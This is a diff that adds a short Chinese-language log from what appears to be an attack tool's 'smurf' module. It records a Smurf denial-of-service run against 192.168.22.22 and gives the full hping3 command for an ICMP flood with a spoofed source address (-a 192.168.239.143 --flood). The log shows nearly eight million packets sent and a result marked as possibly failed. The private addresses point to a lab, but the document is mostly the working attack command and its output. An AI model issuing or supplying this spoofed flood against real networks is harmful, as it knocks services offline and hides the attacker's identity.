@@ -1,0 +1,17 @@
+模組：smurf
+目標IP：192.168.22.22
+封包數：-1
+結果：可能失敗
+時間：20250625_105513
+
+[hping3] 發動 Smurf 攻擊至廣播地址 192.168.22.22，冒充來源：192.168.239.143
+[hping3] 執行指令：sudo hping3 192.168.22.22 --icmp -a 192.168.239.143 --flood
+[hping3] hping in flood mode, no replies will be shown
+[hping3] 收到停止請求，正在終止攻擊...
+[hping3] 
+[hping3] --- 192.168.22.22 hping statistic ---
+[hping3] 7907276 packets transmitted, 0 packets received, 100% packet loss
+[hping3] round-trip min/avg/max = 0.0/0.0/0.0 ms
+[hping3] HPING 192.168.22.22 (eth0 192.168.22.22): icmp mode set, 28 headers + 0 data bytes
+[hping3] 攻擊結束，返回碼：1
+[結果] 攻擊結果：可能失敗
